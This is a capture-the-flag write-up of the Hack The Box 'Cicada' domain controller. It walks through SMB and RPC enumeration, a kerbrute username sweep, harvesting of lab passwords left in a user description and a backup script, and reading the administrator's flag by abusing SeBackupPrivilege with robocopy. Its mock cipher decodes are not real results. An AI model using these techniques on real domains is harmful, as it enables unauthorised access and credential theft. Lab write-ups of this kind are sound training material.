# Cicada Write-Up - HTB

Starting with nmap scan to discover active ports:

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 00:52:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
53185/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-23T00:53:19
|_  start_date: N/A
```

We have a DC ahead.\
SMB and LDAP are primary enumeration targets.

SMB:\


<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

\
We have 2 interesting shares: DEV and HR.

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

Let's see what's inside the file!

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

We have password piece, now we miss username piece of puzzle.\
I decided to run kerbrute to enumerate the active usernames in the domain:`kerbrute userenum --dc cicada.htb -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.tx`&#x20;

Unfortunately, this doesn't give us too much:

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

I now start thinking about the password itself... This string looks like a cipher! Given the box name is Cicada... Hmm, I love this.

So we have: `Cicada$M6Corpb+QLp#nZp!8`

It's interesting, this is a combination real-meaning words and obfuscated/random words. Let's take M6 for example, which could stand for March 6, or Marketing 6 Corp b. Hmm.&#x20;

**Cicada 3301 Tradecraft Considerations**:

*   **Null Cipher**: Extract uppercase letters from obfuscated core:

    ```
    L Z → Position 12 & 26 → 12+26=38 → 38th ASCII = '&' (Not useful)
    ```
*   **Base58 Encoding** (BTC address format):

    ```
    spBLgnbZp → Decodes to raw bytes: 1A 9C F3 (Invalid UTF-8)
    ```
*   **Vigenère Cipher** (Key="CICADA"):

    ```
    Decrypted: 8jW!q2sD → Doesn't resolve
    ```

I realized I am running in circles, it can't be cipher. I reverted to something easier in the meantime, more user enumeration. This time through:

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

Made a list:

```
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Output returned:

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

I tried running evil-winrm, but it seems we are not allowed to connect with our user. Maybe the company didn't apply all the rights yet :drum:

Tried running bloodhound to see what we have, but I realized there must be a chain here... Psexec didn't work neither.

So, I was thinking of doing some thorough rpcqueries with michael's creds.

```bash
rpcclient $> queryuser david.orelious
        User Name   :   david.orelious
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Just in case I forget my password is aRt$Lp#7t*VQ!3
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 15 Mar 2024 08:32:22 EET
        Logoff Time              :      Thu, 01 Jan 1970 02:00:00 EET
        Kickoff Time             :      Thu, 14 Sep 30828 05:48:05 EEST
        Password last set Time   :      Thu, 14 Mar 2024 14:17:30 EET
        Password can change Time :      Fri, 15 Mar 2024 14:17:30 EET
        Password must change Time:      Thu, 14 Sep 30828 05:48:05 EEST
        unknown_2[0..31]...
        user_rid :      0x454
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...

```

Just in case I don't forget his password!

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

Crispy!

The file contains:

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

A new combination found: emily.oscars - Q!3@Lp#M6b\*7t\*Vt

Cicada 3301, footholding: completed! -— We are about to be recruited by a top-secret organization now. Prepare.

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

Let's first check our local privileges by running whoami /all:

```markup
USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

SeBackupPrivilege is on. Game is over.

Really easy stuff here, we won't spend time trying to dump NTDS.dit or making a shadow volume. We will directly "backup" the root flag :)

```
robocopy c:\users\administrator\desktop "C:\users\public\downloads" root.txt /mt /z /b
```

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

Cool machine. Easy af.
